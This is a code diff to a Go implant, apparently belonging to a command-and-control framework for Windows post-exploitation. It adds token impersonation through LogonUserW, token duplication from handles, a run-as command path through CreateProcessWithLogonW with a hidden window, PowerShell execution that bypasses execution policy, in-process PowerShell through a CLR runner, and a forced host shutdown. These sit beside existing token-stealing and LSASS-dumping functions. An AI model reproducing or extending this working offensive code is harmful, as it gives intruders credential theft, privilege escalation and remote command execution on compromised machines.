@@ -54,6 +54,11 @@ var (
 	procDeleteObject             = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteObject")
 	procDeleteDC                 = windows.NewLazySystemDLL("gdi32.dll").NewProc("DeleteDC")
 	procGetDIBits                = windows.NewLazySystemDLL("gdi32.dll").NewProc("GetDIBits")
+	procCreateProcessWithLogonW  = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithLogonW")
+	procCreatePipe               = windows.NewLazySystemDLL("kernel32.dll").NewProc("CreatePipe")
+	procSetHandleInformation     = windows.NewLazySystemDLL("kernel32.dll").NewProc("SetHandleInformation")
+	procWaitForSingleObject2     = windows.NewLazySystemDLL("kernel32.dll").NewProc("WaitForSingleObject")
+	procGetExitCodeProcess2      = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetExitCodeProcess")
 )
 
 // ── Process list ─────────────────────────────────────────────────────────────
@@ -558,9 +563,7 @@ func stealToken(pid int) (string, error) {
 	return fmt.Sprintf("token stolen from PID %d, impersonating", pid), nil
 }
 
-func makeToken(userDomain, password string) (string, error) {
-	// Pin this goroutine to the current OS thread so that
-	// ImpersonateLoggedOnUser's per-thread token stays on the right thread.
+func makeToken(userDomain, password string, netOnly bool) (string, error) {
 	runtime.LockOSThread()
 
 	domain := "."
@@ -578,15 +581,29 @@ func makeToken(userDomain, password string) (string, error) {
 	domainW, _ := windows.UTF16PtrFromString(domain)
 	passW, _ := windows.UTF16PtrFromString(password)
 
+	logonType := uint32(9)  // LOGON32_LOGON_NEW_CREDENTIALS
+	provider   := uint32(3) // LOGON32_PROVIDER_WINNT50
+	if !netOnly {
+		logonType = 4 // LOGON32_LOGON_BATCH
+		provider  = 0 // LOGON32_PROVIDER_DEFAULT
+	}
+
 	var tok windows.Token
 	r, _, e := procLogonUserW.Call(
 		uintptr(unsafe.Pointer(userW)),
 		uintptr(unsafe.Pointer(domainW)),
 		uintptr(unsafe.Pointer(passW)),
-		9, // LOGON32_LOGON_NEW_CREDENTIALS — clones process token, defers cred check to network
-		3, // LOGON32_PROVIDER_WINNT50 — Kerberos delegation support
+		uintptr(logonType), uintptr(provider),
 		uintptr(unsafe.Pointer(&tok)),
 	)
+	if r == 0 && !netOnly {
+		r, _, e = procLogonUserW.Call(
+			uintptr(unsafe.Pointer(userW)), uintptr(unsafe.Pointer(domainW)),
+			uintptr(unsafe.Pointer(passW)),
+			2, 0, // LOGON32_LOGON_INTERACTIVE
+			uintptr(unsafe.Pointer(&tok)),
+		)
+	}
 	if r == 0 {
 		runtime.UnlockOSThread()
 		return "", fmt.Errorf("LogonUser: %w", e)
@@ -601,7 +618,11 @@ func makeToken(userDomain, password string) (string, error) {
 		windows.CloseHandle(windows.Handle(stolenToken))
 	}
 	stolenToken = tok
-	return fmt.Sprintf("token created for %s\\%s", domain, user), nil
+	mode := "netonly"
+	if !netOnly {
+		mode = "interactive"
+	}
+	return fmt.Sprintf("[+] token created for %s\\%s (%s)", domain, user, mode), nil
 }
 
 func dropToken() (string, error) {
@@ -1344,4 +1365,129 @@ func lsassDumpNT(lsassPid uint32) ([]byte, error) {
 	}
 
 	return buf, nil
+}
+
+// shutdownHost shuts down or reboots the host.
+func shutdownHost(reboot bool) {
+	flag := "/s"
+	if reboot {
+		flag = "/r"
+	}
+	exec.Command("shutdown.exe", flag, "/t", "0", "/f").Run() //nolint:errcheck
+}
+
+// runPowerShell runs a PowerShell command and returns its combined output.
+func runPowerShell(cmd string, stdinLines []string) (string, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	defer cancel()
+	c := exec.CommandContext(ctx, "powershell.exe",
+		"-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", cmd)
+	if len(stdinLines) > 0 {
+		c.Stdin = strings.NewReader(strings.Join(stdinLines, "\n") + "\n")
+	}
+	out, err := c.CombinedOutput()
+	return string(out), err
+}
+
+// runAsCmd runs a command as a different user using CreateProcessWithLogonW
+// and captures its combined stdout/stderr output via anonymous pipes.
+func runAsCmd(userDomain, pass, cmd string) (string, error) {
+	runtime.LockOSThread()
+	defer runtime.UnlockOSThread()
+
+	domain := "."
+	user := userDomain
+	if idx := strings.IndexAny(userDomain, `\@`); idx >= 0 {
+		if userDomain[idx] == '\\' {
+			domain = userDomain[:idx]
+			user = userDomain[idx+1:]
+		} else {
+			user = userDomain[:idx]
+			domain = userDomain[idx+1:]
+		}
+	}
+	userW, _ := windows.UTF16PtrFromString(user)
+	domainW, _ := windows.UTF16PtrFromString(domain)
+	passW, _ := windows.UTF16PtrFromString(pass)
+	cmdW, _ := windows.UTF16PtrFromString("cmd.exe /c " + cmd)
+
+	sa := windows.SecurityAttributes{InheritHandle: 1}
+	sa.Length = uint32(unsafe.Sizeof(sa))
+	var outRd, outWr windows.Handle
+	if r, _, e := procCreatePipe.Call(
+		uintptr(unsafe.Pointer(&outRd)),
+		uintptr(unsafe.Pointer(&outWr)),
+		uintptr(unsafe.Pointer(&sa)), 0,
+	); r == 0 {
+		return "", fmt.Errorf("CreatePipe: %w", e)
+	}
+	procSetHandleInformation.Call(uintptr(outRd), 1, 0) // clear HANDLE_FLAG_INHERIT on read end
+	defer windows.CloseHandle(outRd)
+
+	si := windows.StartupInfo{
+		Cb:        uint32(unsafe.Sizeof(windows.StartupInfo{})),
+		Flags:     windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW,
+		ShowWindow: 0,
+		StdInput:  windows.InvalidHandle,
+		StdOutput: outWr,
+		StdErr:    outWr,
+	}
+	var pi windows.ProcessInformation
+	const logonWithProfile = 1
+	r, _, e := procCreateProcessWithLogonW.Call(
+		uintptr(unsafe.Pointer(userW)),
+		uintptr(unsafe.Pointer(domainW)),
+		uintptr(unsafe.Pointer(passW)),
+		logonWithProfile, 0,
+		uintptr(unsafe.Pointer(cmdW)),
+		nil, nil, nil,
+		uintptr(unsafe.Pointer(&si)),
+		uintptr(unsafe.Pointer(&pi)),
+	)
+	windows.CloseHandle(outWr)
+	if r == 0 {
+		return "", fmt.Errorf("CreateProcessWithLogonW: %w", e)
+	}
+	defer windows.CloseHandle(pi.Process)
+	defer windows.CloseHandle(pi.Thread)
+
+	procWaitForSingleObject2.Call(uintptr(pi.Process), 30000) //nolint:errcheck
+
+	var buf [64 * 1024]byte
+	var n uint32
+	windows.ReadFile(outRd, buf[:], &n, nil) //nolint:errcheck
+	return string(buf[:n]), nil
+}
+
+// tokenFromHandle duplicates a token from an existing handle and impersonates it.
+func tokenFromHandle(handleVal uintptr) (string, error) {
+	runtime.LockOSThread()
+
+	src := windows.Token(handleVal)
+	var dup windows.Token
+	r, _, e := procDuplicateTokenEx.Call(
+		uintptr(src), 0x000F01FF, 0,
+		2, 2, // SecurityImpersonation, TokenImpersonation
+		uintptr(unsafe.Pointer(&dup)),
+	)
+	if r == 0 {
+		runtime.UnlockOSThread()
+		return "", fmt.Errorf("DuplicateTokenEx: %w", e)
+	}
+	r, _, e = procImpersonateLoggedOnUser.Call(uintptr(dup))
+	if r == 0 {
+		windows.CloseHandle(windows.Handle(dup))
+		runtime.UnlockOSThread()
+		return "", fmt.Errorf("ImpersonateLoggedOnUser: %w", e)
+	}
+	if stolenToken != 0 {
+		windows.CloseHandle(windows.Handle(stolenToken))
+	}
+	stolenToken = dup
+	return fmt.Sprintf("[+] impersonating token handle 0x%X as %s", handleVal, tokenWhoami()), nil
+}
+
+// powerpickRun executes a PowerShell script via a CLR runner assembly (e.g. SharpPick).
+func powerpickRun(asmBytes []byte, script string) (string, error) {
+	return forkRunAssembly(asmBytes, script, 60)
 }
